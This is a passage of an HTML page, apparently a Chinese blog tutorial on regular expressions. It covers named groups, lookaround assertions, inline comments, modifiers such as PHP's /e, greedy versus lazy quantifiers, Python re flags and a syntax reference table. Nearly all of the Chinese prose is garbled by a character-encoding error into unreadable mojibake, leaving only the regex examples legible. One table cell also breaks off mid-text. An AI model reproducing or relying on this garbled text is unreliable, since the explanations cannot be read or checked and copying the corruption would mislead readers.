href="#è‡ªå®šä¹‰å­è¡¨è¾¾å¼çš„ç»„å" class="headerlink" title="è‡ªå®šä¹‰å­è¡¨è¾¾å¼çš„ç»„å"></a>è‡ªå®šä¹‰å­è¡¨è¾¾å¼çš„ç»„å</h3><p>å­è¡¨è¾¾å¼çš„ç»„åä¹Ÿå¯ä»¥è‡ªå·±å®šä¹‰ï¼š</p><p>ä½¿ç”¨è¯­æ³•å½¢å¦‚ï¼š <code>(? &lt;Word&gt;\w+)</code> (æˆ–è€…æŠŠå°–æ‹¬å·æ¢æˆâ€™ä¹Ÿè¡Œï¼š <code>(?&#39;Word&#39;\w+)</code>)<br>è¿™æ ·å°±æŠŠ <code>\w+</code> çš„ç»„åæŒ‡å®šä¸º <code>Word</code> äº†ã€‚</p><p>åå‘å¼•ç”¨æ—¶ï¼š<code>\k&lt;Word&gt;</code></p><p>ç”±æ­¤å¯ä»¥å°†ä¸Šé¢çš„ä¾‹å­<code>\b(\w+)\b\s+\1\b</code>å†™ä¸º<code>\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b</code></p><h3 id="ä½¿ç”¨-çš„ä¸€äº›å¸¸ç”¨çš„ç‰¹å®šè¯­æ³•"><a href="#ä½¿ç”¨-çš„ä¸€äº›å¸¸ç”¨çš„ç‰¹å®šè¯­æ³•" class="headerlink" title="ä½¿ç”¨ () çš„ä¸€äº›å¸¸ç”¨çš„ç‰¹å®šè¯­æ³•"></a>ä½¿ç”¨ () çš„ä¸€äº›å¸¸ç”¨çš„ç‰¹å®šè¯­æ³•</h3><table><thead><tr><th>åˆ†ç±»</th><th align="center">ä»£ç **/**è¯­æ³•</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td>æ•è·</td><td align="center">(exp)</td><td align="center">åŒ¹é…exp,å¹¶æ•è·æ–‡æœ¬åˆ°<strong>è‡ªåŠ¨å‘½å</strong>çš„ç»„é‡Œ</td></tr><tr><td></td><td align="center">(?exp) or (?â€™nameâ€™exp)</td><td align="center">åŒ¹é…exp,å¹¶æ•è·æ–‡æœ¬åˆ°åç§°ä¸ºnameçš„ç»„é‡Œ</td></tr><tr><td></td><td align="center">(?:exp)</td><td align="center">åŒ¹é…exp,<strong>ä¸æ•è·</strong>åŒ¹é…çš„æ–‡æœ¬ï¼Œä¹Ÿ<strong>ä¸ç»™æ­¤åˆ†ç»„åˆ†é…ç»„å·</strong></td></tr><tr><td>é›¶å®½æ–­è¨€</td><td align="center">(?=exp)</td><td align="center">åŒ¹é…<strong>expå‰é¢</strong>çš„ä½ç½®</td></tr><tr><td></td><td align="center">(?&lt;=exp)</td><td align="center">åŒ¹é…<strong>expåé¢</strong>çš„ä½ç½®</td></tr><tr><td></td><td align="center">(?!exp)</td><td align="center">åŒ¹é…<strong>åé¢</strong>è·Ÿçš„<strong>ä¸æ˜¯exp</strong>çš„ä½ç½®</td></tr><tr><td></td><td align="center">(?&lt;!exp)</td><td align="center">åŒ¹é…<strong>å‰é¢ä¸æ˜¯exp</strong>çš„ä½ç½®</td></tr><tr><td>æ³¨é‡Š</td><td align="center">(?#comment)</td><td align="center">è¿™ç§ç±»å‹çš„åˆ†ç»„ä¸å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„å¤„ç†äº§ç”Ÿä»»ä½•å½±å“ï¼Œç”¨äº<strong>æä¾›æ³¨é‡Š</strong>è®©äººé˜…è¯»</td></tr></tbody></table><h2 id="é›¶å®½æ–­è¨€"><a href="#é›¶å®½æ–­è¨€" class="headerlink" title="é›¶å®½æ–­è¨€"></a>é›¶å®½æ–­è¨€</h2><p>å°±æ˜¯ç”¨äºæŸ¥æ‰¾åœ¨æŸäº›å†…å®¹(ä¸åŒ…æ‹¬è¿™äº›å†…å®¹)ä¹‹å‰æˆ–ä¹‹åçš„ä¸œè¥¿ï¼Œå³æŒ‡å®šå†…å®¹å‰/åçš„ä½ç½®ï¼Œå¹¶ä¸”è¯¥ä½ç½®éœ€æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼ˆæ–­è¨€ï¼‰ï¼›æ•…ç»¼åˆç§°ä¹‹ä¸ºé›¶å®½æ–­è¨€ã€‚</p><p><code>(?=exp)</code>ï¼ˆé›¶å®½åº¦<strong>æ­£</strong>é¢„æµ‹<strong>å…ˆè¡Œ</strong>æ–­è¨€ï¼‰ï¼šæ–­è¨€è‡ªèº«å‡ºç°çš„ä½ç½®çš„<strong>åé¢</strong>èƒ½åŒ¹é…è¡¨è¾¾å¼exp</p><blockquote><p>æ¯”å¦‚ï¼š<code>\b\w+(?=ing\b)</code>ï¼ŒåŒ¹é…<strong>ä»¥ingç»“å°¾</strong>çš„å•è¯çš„å‰é¢éƒ¨åˆ†(<strong>é™¤äº†ingä»¥å¤–çš„éƒ¨åˆ†</strong>)ï¼Œ</p><p>å¦‚æŸ¥æ‰¾<em>Iâ€™m singing while youâ€™re dancing.<em>æ—¶ï¼Œå®ƒä¼šåŒ¹é…</em></em>sing<strong>å’Œ</strong>danc**ã€‚</p></blockquote><p><code>(?&lt;=exp)</code>ï¼ˆé›¶å®½åº¦<strong>æ­£</strong>å›é¡¾<strong>åå‘</strong>æ–­è¨€ï¼‰ï¼šæ–­è¨€è‡ªèº«å‡ºç°çš„ä½ç½®çš„<strong>å‰é¢</strong>èƒ½åŒ¹é…è¡¨è¾¾å¼ exp</p><blockquote><p>æ¯”å¦‚ï¼š<code>(?&lt;=\bre)\w+\b</code>ä¼šåŒ¹é…<strong>ä»¥reå¼€å¤´</strong>çš„å•è¯çš„ååŠéƒ¨åˆ†(<strong>é™¤äº†reä»¥å¤–çš„éƒ¨åˆ†</strong>)ï¼Œ</p><p>ä¾‹å¦‚åœ¨æŸ¥æ‰¾<em>reading a book</em>æ—¶ï¼Œå®ƒåŒ¹é…<strong>ading</strong>ã€‚</p></blockquote><h2 id="è´Ÿå‘é›¶å®½æ–­è¨€"><a href="#è´Ÿå‘é›¶å®½æ–­è¨€" class="headerlink" title="è´Ÿå‘é›¶å®½æ–­è¨€"></a>è´Ÿå‘é›¶å®½æ–­è¨€</h2><p><code>(?!exp)</code>ï¼ˆé›¶å®½åº¦<strong>è´Ÿ</strong>é¢„æµ‹<strong>å…ˆè¡Œ</strong>æ–­è¨€ï¼‰ï¼šæ–­è¨€æ­¤ä½ç½®çš„<strong>åé¢ä¸èƒ½åŒ¹é…</strong>è¡¨è¾¾å¼exp</p><blockquote><p>æ¯”å¦‚ï¼š</p><p><code>\d&#123;3&#125;(?!\d)</code>åŒ¹é…ä¸‰ä½æ•°å­—ï¼Œè€Œä¸”è¿™ä¸‰ä½æ•°å­—çš„åé¢ä¸èƒ½æ˜¯æ•°å­—ï¼›</p><p><code>\b((?!abc)\w)+\b</code>åŒ¹é…ä¸åŒ…å«è¿ç»­å­—ç¬¦ä¸²abcçš„å•è¯ã€‚</p></blockquote><p><code>(?&lt;!exp)</code>ï¼ˆé›¶å®½åº¦<strong>è´Ÿ</strong>å›é¡¾<strong>åå‘</strong>æ–­è¨€ï¼‰ï¼šæ–­è¨€æ­¤ä½ç½®çš„<strong>å‰é¢ä¸èƒ½åŒ¹é…</strong>è¡¨è¾¾å¼exp</p><blockquote><p>æ¯”å¦‚ï¼š</p><p><code>(?&lt;![a-z])\d&#123;7&#125;</code>åŒ¹é…å‰é¢ä¸æ˜¯å°å†™å­—æ¯çš„ä¸ƒä½æ•°å­—ã€‚</p><p><code>(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</code>åŒ¹é…ä¸åŒ…å«å±æ€§çš„ç®€å•HTMLæ ‡ç­¾å†…é‡Œçš„å†…å®¹</p><p>è§£æï¼š<br><code>(?&lt;=&lt;(\w+)&gt;)</code>æŒ‡å®šäº†<strong>å‰ç¼€</strong>ï¼šè¢«å°–æ‹¬å·æ‹¬èµ·æ¥çš„å•è¯(æ¯”å¦‚å¯èƒ½æ˜¯<code>&lt;b&gt;</code>)ï¼Œ<br><code>.</code> <code>*</code>(ä»»æ„çš„å­—ç¬¦ä¸²),æœ€åæ˜¯ä¸€ä¸ª<strong>åç¼€</strong><code>(?=&lt;\/\1&gt;)</code>ã€‚<br>åç¼€é‡Œçš„<code>\/</code>ç”¨åˆ°äº†å‰é¢æè¿‡çš„å­—ç¬¦è½¬ä¹‰ï¼›<br><code>\1</code>æ˜¯ä¸€ä¸ªåå‘å¼•ç”¨ï¼Œå¼•ç”¨æ•è·çš„ç¬¬ä¸€ç»„ï¼Œå‰é¢ <code>(\w+)</code> åŒ¹é…çš„å†…å®¹</p><p>è¿™æ ·å¦‚æœå‰ç¼€å®é™…ä¸Šæ˜¯ <code>&lt;b&gt;</code> çš„è¯ï¼Œåç¼€å°±æ˜¯ <code>&lt;/b&gt;</code> äº†ã€‚</p><p>æ•´ä¸ªè¡¨è¾¾å¼åŒ¹é…çš„æ˜¯ <code>&lt;b&gt;</code> å’Œ <code>&lt;/b&gt;</code> ä¹‹é—´çš„å†…å®¹(ä¸åŒ…æ‹¬å‰ç¼€å’Œåç¼€æœ¬èº«)ã€‚</p></blockquote><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><p>é€šè¿‡è¯­æ³•<code>(?#comment)</code>æ¥åŒ…å«æ³¨é‡Š</p><blockquote><p>æ¯”å¦‚ï¼š<code>2[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199)</code></p></blockquote><p>è¦åŒ…å«æ³¨é‡Šçš„è¯ï¼Œæœ€å¥½æ˜¯å¯ç”¨â€œå¿½ç•¥æ¨¡å¼é‡Œçš„ç©ºç™½ç¬¦â€é€‰é¡¹ï¼Œè¿™æ ·åœ¨ç¼–å†™è¡¨è¾¾å¼æ—¶èƒ½ä»»æ„çš„æ·»åŠ ç©ºæ ¼ï¼ŒTabï¼Œæ¢è¡Œï¼Œè€Œå®é™…ä½¿ç”¨æ—¶è¿™äº›éƒ½å°†è¢«å¿½ç•¥ã€‚<br>å¯ç”¨è¿™ä¸ªé€‰é¡¹åï¼Œåœ¨#åé¢åˆ°è¿™ä¸€è¡Œç»“æŸçš„æ‰€æœ‰æ–‡æœ¬éƒ½å°†è¢«å½“æˆæ³¨é‡Šå¿½ç•¥æ‰ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†å‰é¢çš„ä¸€ä¸ªè¡¨è¾¾å¼å†™æˆè¿™æ ·ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript">(?&lt;=    <span class="hljs-comment"># æ–­è¨€è¦åŒ¹é…çš„æ–‡æœ¬çš„å‰ç¼€</span><br>&lt;(<span class="hljs-string">\w+)&gt;</span> <span class="hljs-comment"># æŸ¥æ‰¾å°–æ‹¬å·æ‹¬èµ·æ¥çš„å†…å®¹</span><br>        <span class="hljs-comment"># (å³HTML/XMLæ ‡ç­¾)</span><br>)       <span class="hljs-comment"># å‰ç¼€ç»“æŸ</span><br>.*      <span class="hljs-comment"># åŒ¹é…ä»»æ„æ–‡æœ¬</span><br>(?=     <span class="hljs-comment"># æ–­è¨€è¦åŒ¹é…çš„æ–‡æœ¬çš„åç¼€</span><br>&lt;<span class="hljs-string">\/\1&gt;</span>  <span class="hljs-comment"># æŸ¥æ‰¾å°–æ‹¬å·æ‹¬èµ·æ¥çš„å†…å®¹</span><br>        <span class="hljs-comment"># æŸ¥æ‰¾å°–æ‹¬å·æ‹¬èµ·æ¥çš„å†…å®¹</span><br>)       <span class="hljs-comment"># åç¼€ç»“æŸ</span><br></code></pre></td></tr></table></figure><h2 id="ä¿®æ­£æ¨¡å¼"><a href="#ä¿®æ­£æ¨¡å¼" class="headerlink" title="ä¿®æ­£æ¨¡å¼"></a>ä¿®æ­£æ¨¡å¼</h2><p>ç»™æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…è¿‡ç¨‹æ·»åŠ ä¸€ç§åŒ¹é…æ¨¡å¼</p><ul><li><code>U</code> åŠ <code>U</code>æ˜¯æ‡’æƒ°åŒ¹é…ï¼Œä¸åŠ <code>U</code>æ˜¯é»˜è®¤çš„è´ªå©ªåŒ¹é…ã€‚</li><li><code>i</code> å¿½ç•¥è‹±æ–‡å­—æ¯å¤§å°å†™ã€‚</li><li><code>x</code> å¿½ç•¥ç©ºç™½ã€‚ï¼ˆåŒ…æ‹¬ç©ºæ ¼å’ŒæŒ‰tabé”®è¾“å‡ºçš„åˆ¶è¡¨ç¬¦ï¼‰</li><li><code>s</code> è®©å…ƒå­—ç¬¦<code>.</code>åŒ¹é…åŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…çš„æ‰€æœ‰å­—ç¬¦ã€‚</li><li><code>e</code> <code>preg_replace()</code>åœ¨æ›¿æ¢å­—ç¬¦ä¸²ä¸­å¯¹é€†å‘å¼•ç”¨ä½œæ­£å¸¸çš„æ›¿æ¢ã€‚ç®€å•çš„è¯´ï¼Œå°±æ˜¯PHPä¼šæŠŠreplaceçš„ç»“æœå½“åšPHPä»£ç ã€‚ï¼ˆæ›¿æ¢å­—ç¬¦ä¸²è¦ç¬¦åˆphpçš„è¯­æ³•è§„èŒƒï¼‰<br>ä¾‹å¦‚ï¼š<code>echo preg_replace(&#39;/(\d+),(\d+)/e&#39;, &#39;$1+$2&#39;, &#39;2,3&#39;);</code>ä¼šè¾“å‡º<code>5</code>ã€‚</li></ul><h2 id="è´ªå©ªä¸æ‡’æƒ°"><a href="#è´ªå©ªä¸æ‡’æƒ°" class="headerlink" title="è´ªå©ªä¸æ‡’æƒ°"></a>è´ªå©ªä¸æ‡’æƒ°</h2><h3 id="è´ªå©ªåŒ¹é…"><a href="#è´ªå©ªåŒ¹é…" class="headerlink" title="è´ªå©ªåŒ¹é…"></a>è´ªå©ªåŒ¹é…</h3><p>å½“æ­£åˆ™è¡¨è¾¾å¼ä¸­åŒ…å«èƒ½æ¥å—é‡å¤çš„é™å®šç¬¦æ—¶ï¼Œé€šå¸¸çš„è¡Œä¸ºæ˜¯åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ï¼ˆåœ¨ä½¿æ•´ä¸ªè¡¨è¾¾å¼èƒ½å¾—åˆ°åŒ¹é…çš„å‰æä¸‹ï¼‰</p><p>å¦‚ï¼š<code>a.*b</code>ä¼šåŒ¹é…æœ€é•¿çš„  ä»¥aå¼€å§‹ï¼Œbç»“æŸ  çš„å­—ç¬¦ä¸²ï¼›<br>å½“ä»¥æ­¤å¯¹aababè¿›è¡Œæœç´¢ï¼Œå°±ä¼šåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²aabab</p><h3 id="æ‡’æƒ°åŒ¹é…"><a href="#æ‡’æƒ°åŒ¹é…" class="headerlink" title="æ‡’æƒ°åŒ¹é…"></a>æ‡’æƒ°åŒ¹é…</h3><p>ä¹Ÿå°±æ˜¯æ˜¯åŒ¹é…å°½å¯èƒ½å°‘çš„å­—ç¬¦ã€‚<br>åªéœ€åœ¨é™å®šç¬¦ååŠ ä¸Š<code>?</code>å³å¯è½¬æ¢ä¸ºæ‡’æƒ°åŒ¹é…æ¨¡å¼</p><p>å¦‚<code>a.*?b</code>åŒ¹é…æœ€çŸ­çš„  ä»¥aå¼€å§‹ï¼Œbç»“æŸ  çš„å­—ç¬¦ä¸²ï¼›<br>å½“ä»¥æ­¤å¯¹aababè¿›è¡Œæœç´¢ï¼Œå°±ä¼šåŒ¹é…aabå’Œab</p><h4 id="æ‡’æƒ°é™å®šç¬¦ï¼š"><a href="#æ‡’æƒ°é™å®šç¬¦ï¼š" class="headerlink" title="æ‡’æƒ°é™å®šç¬¦ï¼š"></a>æ‡’æƒ°é™å®šç¬¦ï¼š</h4><table><thead><tr><th>ä»£ç **/**è¯­æ³•</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td>*?</td><td align="left">é‡å¤ä»»æ„æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr><tr><td>+?</td><td align="left">é‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr><tr><td>??</td><td align="left">é‡å¤0æ¬¡æˆ–1æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr><tr><td>{n,m}?</td><td align="left">é‡å¤nåˆ°mæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr><tr><td>{n,}?</td><td align="left">é‡å¤næ¬¡ä»¥ä¸Šï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr></tbody></table><h2 id="å¤„ç†é€‰é¡¹ï¼ˆåŸºäºpythonï¼‰"><a href="#å¤„ç†é€‰é¡¹ï¼ˆåŸºäºpythonï¼‰" class="headerlink" title="å¤„ç†é€‰é¡¹ï¼ˆåŸºäºpythonï¼‰"></a>å¤„ç†é€‰é¡¹ï¼ˆåŸºäºpythonï¼‰</h2><p>Python ä¸­å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼é€‰é¡¹ï¼ˆç”¨åˆ°reæ¨¡å—ï¼ï¼‰ï¼š</p><table><thead><tr><th>åç§°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>re.IGNORECASE</td><td>åŒ¹é…æ—¶ä¸åŒºåˆ†å¤§å°å†™ã€‚</td></tr><tr><td>re.MULTILINE</td><td>æ›´æ”¹^å’Œ$çš„å«ä¹‰ï¼Œä½¿å®ƒä»¬åˆ†åˆ«åœ¨ä»»æ„ä¸€è¡Œçš„è¡Œé¦–å’Œè¡Œå°¾åŒ¹é…ï¼Œè€Œä¸ä»…ä»…åœ¨æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾åŒ¹é…ã€‚(åœ¨æ­¤æ¨¡å¼ä¸‹,$çš„ç²¾ç¡®å«æ„æ˜¯:åŒ¹é…\nä¹‹å‰çš„ä½ç½®ä»¥åŠå­—ç¬¦ä¸²ç»“æŸå‰çš„ä½ç½®.)</td></tr><tr><td>re.DOTALL</td><td>æ›´æ”¹.çš„å«ä¹‰ï¼Œä½¿å®ƒä¸æ¯ä¸€ä¸ªå­—ç¬¦åŒ¹é…ï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦\nï¼‰ã€‚</td></tr><tr><td>re.VERBOSE</td><td>å¿½ç•¥è¡¨è¾¾å¼ä¸­çš„éè½¬ä¹‰ç©ºç™½å¹¶å¯ç”¨ç”±#æ ‡è®°çš„æ³¨é‡Šã€‚</td></tr><tr><td>re.DEBUG</td><td>æ˜¾ç¤ºç¼–è¯‘è¡¨è¾¾å¼çš„ debug ä¿¡æ¯</td></tr></tbody></table><h2 id="å¹³è¡¡ç»„-amp-é€’å½’åŒ¹é…"><a href="#å¹³è¡¡ç»„-amp-é€’å½’åŒ¹é…" class="headerlink" title="å¹³è¡¡ç»„&amp;é€’å½’åŒ¹é…"></a>å¹³è¡¡ç»„&amp;é€’å½’åŒ¹é…</h2><p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šåŒ¹é…åµŒå¥—å­—ç¬¦ä¸²ï¼Œå¦‚åŒ¹é…ç±»ä¸­çš„å¤§æ‹¬å·ï¼ŒHTMLä¸­çš„å°–æ‹¬å·ç­‰</p><p><code>(?&#39;group&#39;)</code> æŠŠæ•è·çš„å†…å®¹å‘½åä¸ºgroup,å¹¶å‹å…¥å †æ ˆ(Stack) </p><p><code>(?&#39;-group&#39;)</code> ä»å †æ ˆä¸Šå¼¹å‡ºæœ€åå‹å…¥å †æ ˆçš„åä¸ºgroupçš„æ•è·å†…å®¹ï¼Œå¦‚æœå †æ ˆæœ¬æ¥ä¸ºç©ºï¼Œåˆ™æœ¬åˆ†ç»„çš„åŒ¹é…å¤±è´¥ </p><p><code>(?(group)yes|no)</code> å¦‚æœå †æ ˆä¸Šå­˜åœ¨ä»¥åä¸ºgroupçš„æ•è·å†…å®¹çš„è¯ï¼Œç»§ç»­åŒ¹é…yeséƒ¨åˆ†çš„è¡¨è¾¾å¼ï¼Œå¦åˆ™ç»§ç»­åŒ¹é…noéƒ¨åˆ† </p><p><code>(?!)</code> é›¶å®½è´Ÿå‘å…ˆè¡Œæ–­è¨€ï¼Œç”±äºæ²¡æœ‰åç¼€è¡¨è¾¾å¼ï¼Œè¯•å›¾åŒ¹é…æ€»æ˜¯å¤±è´¥</p><p>æˆ‘ä»¬è¦åšçš„æ˜¯ï¼š</p><p>æ¯ç¢°åˆ°äº†å·¦æ‹¬å·ï¼Œå°±åœ¨å‹å…¥ä¸€ä¸ªâ€Openâ€, æ¯ç¢°åˆ°ä¸€ä¸ªå³æ‹¬å·ï¼Œå°±å¼¹å‡ºä¸€ä¸ªï¼Œåˆ°äº†æœ€åå°±çœ‹çœ‹å †æ ˆæ˜¯å¦ä¸ºç©ºï¼›</p><p>ä¸ä¸ºç©º  -ã€‹è¯æ˜å·¦æ‹¬å·æ¯”å³æ‹¬å·å¤šï¼Œé‚£åŒ¹é…å°±åº”è¯¥å¤±è´¥ã€‚</p><p>æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ä¼šè¿›è¡Œå›æº¯(æ”¾å¼ƒæœ€å‰é¢æˆ–æœ€åé¢çš„ä¸€äº›å­—ç¬¦)ï¼Œå°½é‡ä½¿æ•´ä¸ªè¡¨è¾¾å¼å¾—åˆ°åŒ¹é…</p><h2 id="æ­£åˆ™è¡¨è¾¾å¼æ‰‹å†Œ"><a href="#æ­£åˆ™è¡¨è¾¾å¼æ‰‹å†Œ" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼æ‰‹å†Œ"></a>æ­£åˆ™è¡¨è¾¾å¼æ‰‹å†Œ</h2><h3 id="è¡¨è¾¾å¼å…¨é›†"><a href="#è¡¨è¾¾å¼å…¨é›†" class="headerlink" title="è¡¨è¾¾å¼å…¨é›†"></a>è¡¨è¾¾å¼å…¨é›†</h3><table><thead><tr><th align="center">å­—ç¬¦</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">\</td><td align="center">å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>n</code>â€åŒ¹é…å­—ç¬¦â€œ<code>n</code>â€ã€‚â€œ<code>\n</code>â€åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ä¸²è¡Œâ€œ<code>\\</code>â€åŒ¹é…â€œ<code>\</code>â€è€Œâ€œ<code>\(</code>â€åˆ™åŒ¹é…â€œ<code>(</code>â€ã€‚</td></tr><tr><td align="center">^</td><td align="center">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ^ä¹ŸåŒ¹é…â€œ<code>\n</code>â€æˆ–â€œ<code>\r</code>â€ä¹‹åçš„ä½ç½®ã€‚</td></tr><tr><td align="center">$</td><td align="center">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ$ä¹ŸåŒ¹é…â€œ<code>\n</code>â€æˆ–â€œ<code>\r</code>â€ä¹‹å‰çš„ä½ç½®ã€‚</td></tr><tr><td align="center">*</td><td align="center">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo<em>èƒ½åŒ¹é…â€œ<code>z</code>â€ä»¥åŠâ€œ<code>zoo</code>â€ã€‚</em>ç­‰ä»·äº{0,}ã€‚</td></tr><tr><td align="center">+</td><td align="center">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>zo+</code>â€èƒ½åŒ¹é…â€œ<code>zo</code>â€ä»¥åŠâ€œ<code>zoo</code>â€ï¼Œä½†ä¸èƒ½åŒ¹é…â€œ<code>z</code>â€ã€‚+ç­‰ä»·äº{1,}ã€‚</td></tr><tr><td align="center">?</td><td align="center">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>do(es)?</code>â€å¯ä»¥åŒ¹é…â€œ<code>does</code>â€æˆ–â€œ<code>does</code>â€ä¸­çš„â€œ<code>do</code>â€ã€‚?ç­‰ä»·äº{0,1}ã€‚</td></tr><tr><td align="center">{<em>n</em>}</td><td align="center"><em>n</em>æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„<em>n</em>æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>o&#123;2&#125;</code>â€ä¸èƒ½åŒ¹é…â€œ<code>Bob</code>â€ä¸­çš„â€œ<code>o</code>â€ï¼Œä½†æ˜¯èƒ½åŒ¹é…â€œ<code>food</code>â€ä¸­çš„ä¸¤ä¸ªoã€‚</td></tr><tr><td align="center">{<em>n</em>,}</td><td align="center"><em>n</em>æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…<em>n</em>æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>o&#123;2,&#125;</code>â€ä¸èƒ½åŒ¹é…â€œ<code>Bob</code>â€ä¸­çš„â€œ<code>o</code>â€ï¼Œä½†èƒ½åŒ¹é…â€œ<code>foooood</code>â€ä¸­çš„æ‰€æœ‰oã€‚â€œ<code>o&#123;1,&#125;</code>â€ç­‰ä»·äºâ€œ<code>o+</code>â€ã€‚â€œ<code>o&#123;0,&#125;</code>â€åˆ™ç­‰ä»·äºâ€œ<code>o*</code>â€ã€‚</td></tr><tr><td align="center">{<em>n</em>,<em>m</em>}</td><td align="center"><em>m</em>å’Œ<em>n</em>å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­<em>n</em>&lt;=<em>m</em>ã€‚æœ€å°‘åŒ¹é…<em>n</em>æ¬¡ä¸”æœ€å¤šåŒ¹é…<em>m</em>æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€œ<code>o&#123;1,3&#125;</code>â€å°†åŒ¹é…â€œ<code>fooooood</code>â€ä¸­çš„å‰ä¸‰ä¸ªoã€‚â€œ<code>o&#123;0,1&#125;</code>â€ç­‰ä»·äºâ€œ<code>o?</code>â€ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</td></tr><tr><td align="center">?</td><td align="center">å½“è¯¥å­—ç¬¦ç´§è·Ÿåœ¨ä»»ä½•ä¸€ä¸ªå…¶ä»–é™åˆ¶ç¬¦ï¼ˆ*,+,?ï¼Œ{<em>n</em>}ï¼Œ{<em>n</em>,}ï¼Œ{<em>n</em>,<em>m</em>}ï¼‰åé¢æ—¶ï¼ŒåŒ¹é…æ¨¡å¼æ˜¯éè´ªå©ªçš„ã€‚éè´ªå©ªæ¨¡å¼å°½å¯èƒ½å°‘çš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè€Œé»˜è®¤çš„è´ªå©ªæ¨¡å¼åˆ™å°½å¯èƒ½å¤šçš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå­—ç¬¦ä¸²â€œ<code>oooo</code>â€ï¼Œâ€œ<code>o+?</code>â€å°†åŒ¹é…å•ä¸ªâ€œ<code>o</code>â€ï¼Œè€Œâ€œ<code>o+</code>â€å°†åŒ¹é…æ‰€æœ‰â€œ<code>o</code>â€ã€‚</td></tr><tr><td align="center">.</td><td align="center">åŒ¹é…é™¤â€œ<code>\</code>*<code>n</code><em>â€ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è¦åŒ¹é…åŒ…æ‹¬â€œ<code>\</code></em><code>n</code>*â€åœ¨å†…çš„ä»»ä½•å­—ç¬¦ï¼Œè¯·ä½¿ç”¨åƒâ€œ`(.</td></tr><tr><td align="center">(pattern)</td><td align="center">åŒ¹é…patternå¹¶è·å–è¿™ä¸€åŒ¹é…ã€‚æ‰€è·å–çš„åŒ¹é…å¯ä»¥ä»äº§ç”Ÿçš„Matchesé›†åˆå¾—åˆ°ï¼Œåœ¨VBScriptä¸­ä½¿ç”¨SubMatchesé›†åˆï¼Œåœ¨JScriptä¸­åˆ™ä½¿ç”¨$0â€¦$9å±æ€§ã€‚è¦åŒ¹é…åœ†æ‹¬å·å­—ç¬¦ï¼Œè¯·ä½¿ç”¨â€œ<code>\(</code>â€æˆ–â€œ<code>\)</code>â€ã€‚</td></tr><tr><td align="center">(?:pattern)</td><td 